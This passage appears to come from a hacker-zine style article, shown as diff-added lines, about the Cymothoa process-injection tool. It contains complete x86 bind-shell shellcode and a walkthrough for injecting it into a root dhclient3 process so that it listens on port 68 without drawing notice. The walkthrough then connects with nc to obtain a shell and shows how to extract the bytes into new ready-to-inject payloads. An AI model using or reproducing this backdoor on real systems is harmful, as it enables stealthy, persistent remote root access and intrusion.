+	jmp     socket_args
+load_socket_args:
+	pop     %ecx
+	int     $0x80 # %eax = socket descriptor
+
+	# save socket descriptor
+	mov     $0xdeadbeef, %ebx
+	mov     %ebx, (%esi)
+	add     $4, %esi
+	mov     %eax, (%esi)
+	sub     $4, %esi
+	jmp     fcntl_call
+
+socket_args:
+	call load_socket_args
+	.long	0x02	# AF_INET
+	.long	0x01	# SOCK_STREAM
+	.long	0x00	# NULL
+
+fcntl_call:
+	# call to sys_fcntl(socket, F_GETFL)
+	mov     %eax, %ebx
+	xorl    %eax, %eax
+	mov     $55, %al
+	xorl    %ecx, %ecx
+	mov     $3, %cl
+	int     $0x80
+	# call to sys_fcntl(socket, F_SETFL, flags | O_NONBLOCK)
+	mov     %eax, %edx
+	xorl    %eax, %eax
+	mov     $55, %al
+	mov     $4, %cl
+	orl     $0x800, %edx  # O_NONBLOCK (nonblocking socket)
+	int     $0x80
+
+bind_call:
+	# prepare sys_socketcall (bind) arguments
+	jmp     struct_sockaddr
+load_sockaddr:
+	pop     %ecx
+	push    $0x10   # sizeof(struct_sockaddr)
+	push    %ecx    # struct_sockaddr address
+	push    %ebx    # socket descriptor
+
+	# call to sys_socketcall($0x02 (bind), *args)
+	xorl    %eax, %eax
+	mov     $102, %al
+	xorl    %ebx, %ebx
+	mov     $0x02, %bl
+	mov     %esp, %ecx
+	int     $0x80
+	jmp     listen_call
+
+struct_sockaddr:
+	call load_sockaddr
+	.short	0x02	# AF_INET
+	.short	0x5250	# PORT (replaced by the injector)
+	.long	0x00	# INADDR_ANY
+
+listen_call:
+	pop     %eax    # socket descriptor
+	pop     %ebx
+	push    $0x10   # queue (backlog)
+	push    %eax    # socket descriptor
+
+	# call to sys_socketcall($0x04 (listen), *args)
+	xorl    %eax, %eax
+	mov     $102, %al
+	xorl    %ebx, %ebx
+	mov     $0x04, %bl
+	mov     %esp, %ecx
+	int     $0x80
+
+	# restore stack
+	pop     %edi
+	pop     %edi
+	pop     %edi
+
+accept_call:
+	# prepare sys_socketcall (accept) arguments
+	xorl    %ecx, %ecx
+	push    %ecx         # socklen_t *addrlen
+	push    %ecx         # struct sockaddr *addr
+	add     $4, %esi
+	push    (%esi)       # socket descriptor
+
+	# call to sys_socketcall($0x05 (accept), *args)
+	xorl    %eax, %eax
+	mov     $102, %al
+	xorl    %ebx, %ebx
+	mov     $0x05, %bl
+	mov     %esp, %ecx
+	int     $0x80       # %eax = file descriptor or negative (on error)
+	mov     %eax, %edx  # save file descriptor
+
+	# restore stack
+	pop     %edi
+	pop     %edi
+	pop     %edi
+
+	# check return value
+	test    %eax, %eax
+	js      schedule_next_and_return  # jump on error (negative %eax)
+
+
+fork_child:
+	# call to sys_fork()
+	xorl    %eax, %eax
+	mov     $2, %al
+	int     $0x80
+
+	test    %eax, %eax
+	jz      dup2_multiple_calls  # child continue execution
+	                             # parent schedule_next_and_return
+
+schedule_next_and_return:
+
+	# call to sys_close(socket file descriptor)
+	# (since is used only by the child process)
+	xorl    %eax, %eax
+	mov     $6, %al
+	mov     %edx, %ebx
+	int     $0x80
+
+	# call to sys_waitpid(-1, NULL, WNOHANG)
+	# (to remove zombie processes)
+	xorl    %eax, %eax
+	mov     $7, %al
+	xorl    %ebx, %ebx
+	dec     %ebx
+	xorl    %ecx, %ecx
+	xorl    %edx, %edx
+	mov     $1, %dl
+	int     $0x80
+
+	# alarm(timeout)
+	xorl    %eax, %eax
+	mov     $27, %al
+	movl    $0x53434553, %ebx    # replaced by the injector (seconds)
+	int     $0x80
+
+	# return
+	popa
+	ret
+
+dup2_multiple_calls:
+	# dup2(socket, 2), dup2(socket, 1), dup2(socket, 0)
+	xorl    %eax, %eax
+	xorl    %ecx, %ecx
+	mov     %edx, %ebx
+	mov     $2, %cl
+dup2_loop:
+	mov     $63, %al
+	int     $0x80
+	dec     %ecx
+	jns     dup2_loop
+
+execve_call:
+	# call to sys_execve(program, *args)
+	xorl    %eax, %eax
+	mov     $11, %al
+	jmp     program_path
+load_program_path:
+	pop     %ebx
+	# create argument list [program_path, NULL]
+	xorl    %ecx, %ecx
+	push    %ecx
+	push    %ebx
+	mov     %esp, %ecx
+	mov	%esp, %edx
+	int     $0x80
+
+program_path:
+	call load_program_path
+	.ascii  "/bin/sh"
+
+%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%
+
+A little summary of the code:
+1) Half preable, only the signal() part.
+2) Check to see if it's the first execution. This step makes use of a
+   persistent memory location, provided by the injector.
+2.1) If already initialized jump to 7
+2.2) If not initialized continue
+3) Open socket.
+4) Set nonblocking using fcntl().
+5) Bind socket to the specified port.
+6) Socket in listen mode with listen().
+7) Check if a client is connected using accept().
+7.1) No clients, jump to 9
+7.2) Client connected, continue
+8) Fork() a child process and execute a shell.
+9) Set the timer and resume host execution
+   (the second half of the preamble)
+
+For this shellcode the provided arguments are a persistent memory
+address, the port to listen on and the timer (in seconds).
+
+Finally, let's see a practical example of use.
+
+First, we must identify our host process. We need also to find a door is
+not likely to arouse suspicion.
+
+root@victim# lsof -a -i -c dhclient3
+COMMAND    PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
+dhclient3 1232 root    5u  IPv4   4555      0t0  UDP *:bootpc
+dhclient3 1612 root    4u  IPv4   4554      0t0  UDP *:bootpc
+
+Here we can see two dhclient3 processes with port 68/UDP open (bootpc): a
+good strategy for our backdoor is to listen on port 68/TCP...
+
+root@victim# ./cymothoa -p 1612 -s 13 -j 1 -y 68
+[+] attaching to process 1612
+
+ register info:
+ -----------------------------------------------------------
+ eax value: 0xfffffdfe   ebx value: 0x6
+ esp value: 0xbfff6dd0   eip value: 0xb7682430
+ ------------------------------------------------------------
+
+[+] new esp: 0xbfff6dcc
+[+] injecting code into 0xb7683000
+[+] copy general purpose registers
+[+] persistent memory at 0xb769f000 (if used)
+[+] detaching from 1612
+
+[+] infected!!!
+
+Let's see the result:
+
+root@victim# lsof -a -i -c dhclient3
+COMMAND    PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
+dhclient3 1232 root    5u  IPv4   4555      0t0  UDP *:bootpc
+dhclient3 1612 root    4u  IPv4   4554      0t0  UDP *:bootpc
+dhclient3 1612 root    7u  IPv4  21892      0t0  TCP *:bootpc (LISTEN)
+
+As you can see it is very difficult to see that something is wrong...
+
+Now the attacker can connect to the victim and get a shell:
+
+root@attacker# nc -vv victim_ip 68
+Connection to victim_ip 68 port [tcp/bootpc] succeeded!
+uname -a
+Linux victim 2.6.38 #1 SMP Thu Mar 17 20:52:18 EDT 2011 i686 GNU/Linux
+
+We have achieved our goal: a single process backdoor :)
+
+------[ 6. Something about the injector
+
+In all these examples we always used the injector cymothoa [3].
+Some notes about this tool...
+
+The injector is very important because it allows the customization of the
+shellcode and its injection in the right areas of memory.
+
+Cymothoa wants to be an aid to developing shellcode, in several ways.
+
+In the payloads directory there are all the assembly sources created by the
+author, easily compilable with gcc:
+
+root@box# cd payloads
+root@box# ls
+clone_shellcode.s            fork_shellcode.s
+scheduled_backdoor_alarm.s   mmx_example_shellcode.s
+scheduled_setitimer.s        scheduled_alarm.s
+scheduled_tail_setitimer.s
+root@box# gcc -c scheduled_backdoor_alarm.s
+root@box#
+
+Cymothoa includes also some tools to easily extract the shellcode from
+these object files.
+
+For example bgrep [6], a binary grep, that allows to find the offset of
+of particular hexadecimal sequences:
+
+root@box# ./bgrep e8f0ffffff payloads/scheduled_backdoor_alarm.o
+payloads/scheduled_backdoor_alarm.o: 0000014b
+
+This is useful for finding the beginning of the code to extract.
+
+Once you locate the beginning and the length of the code, you can easily
+turn it into a C string with the script hexdump_to_cstring.pl.
+
+root@box# hexdump -C -s 52 payloads/scheduled_backdoor_alarm.o -n 291 | \
+          ./hexdump_to_cstring.pl
+\x60\x31\xc0\x31\xdb\xb0\x30\xb3\x0e\xeb\x08\x59\x83\xe9\x18\xcd\x80\xeb
+\x05\xe8\xf3\xff\xff\xff\xbe\x50\x4d\x45\x4d\x8b\x06\x3d\xef\xbe\xad\xde
+\x0f\x84\x81\x00\x00\x00\x31\xc0\xb0\x66\x31\xdb\xb3\x01\xeb\x14\x59\xcd
+...
+
+Once this is done you can add this string to the file payloads.h, and
+recompile cymothoa, to have a new, ready to inject, parasite.
+
+If you want to transform into parasite code you already have available,
+that's the easy way.
+
+The last thing I want to mention about cymothoa, is a little utility
+shipped with the main tool: a syscall code generator.
+
+Writing syscall based shellcodes can be a tedious work, especially if
+you must remember every syscall number and parameters.
+
+Since I am a lazy person, I've written a script able to do part of
+the hard work:
+
+root@box# ./syscall_code.pl
+Syscall shellcode generator
+Usage:
+        ./syscall_code.pl syscall
+
+For example you can use it to generate the calling sequence for the
+open syscall:
+
+root@box# ./syscall_code.pl sys_open
+sys_open_call:
+        # call to sys_open(filename, flags, mode)
+        xorl    %eax, %eax
+        mov     $5, %al
+        xorl    %ebx, %ebx
+        mov     filename, %bl
+        xorl    %ecx, %ecx
+        mov     flags, %cl
+        xorl    %edx, %edx
+        mov     mode, %dl
+        int     $0x80
+
+As you can see the script generates assembly code that marks arguments and
+corresponding registers of the syscall, as well as the call number.
+
+The code is not always 100% reliable (e.g. some syscalls require complex
+structures the script is not able to construct), but it can  greatly speed
+up the shellcode development phase.
+
+I hope you'll find it useful...
+
+------[ 7. Further reading
+
+While I was writing this article, on the defcon's website have been
+published the talks which will take place during the next edition.
+
+One of these caught my attention [7]:
+
+     Jugaad - Linux Thread Injection Kit
+
+   "... The kit currently works on Linux, allocates space inside
+    a process and injects and executes arbitrary payload as a
+    thread into that process. It utilizes the ptrace() functionality
+    to manipulate other processes on the system. ptrace() is an API
+    generally used by debuggers to manipulate(debug) a program.
+    By using the same functionality to inject and manipulate the
+    flow of execution of a program Jugaad is able to inject the
+    payload as a thread."
+
+I recommend all readers who have judged this article interesting, to follow
+this talk, because it is a similar research, but parallel to mine.
+
+My goal was to implement a stealth backdoor without creating new processes
+or threads, while the research of Aseem focuses on the creation of threads,
+to achieve the same level of stealthiness.
+
+I therefore offer my best wishes to Aseem, since I think our works are
+complementary.
+
+For additional material on "injection of code" you can see the links
+listed at the end of the document.
+
+Bye bye ppl ;)
+
+Greetings (in random order): emgent, scox, white_sheep (and all ihteam),
+sugar, renaud, bt_smarto, cris.
+
+------[ 8. Links and references
+
+[0] https://secure.wikimedia.org/wikipedia/en/wiki/Ptrace
+[1] http://dl.packetstormsecurity.net/papers/unix/elf-runtime-fixup.txt
+[2] http://www.phrack.org/issues.html?issue=58&id=4#article
+    (5 - The dynamic linker's dl-resolve() function)
+[3] http://vxheavens.com/lib/vrn00.html#c42
+[4] http://cymothoa.sourceforge.net/
+[5] http://www.exploit-db.com/exploits/13388/
+[6] http://debugmo.de/2009/04/bgrep-a-binary-grep/
+[7] https://www.defcon.org/html/defcon-19/dc-19-speakers.html#Jakhar
+
+------[ EOF
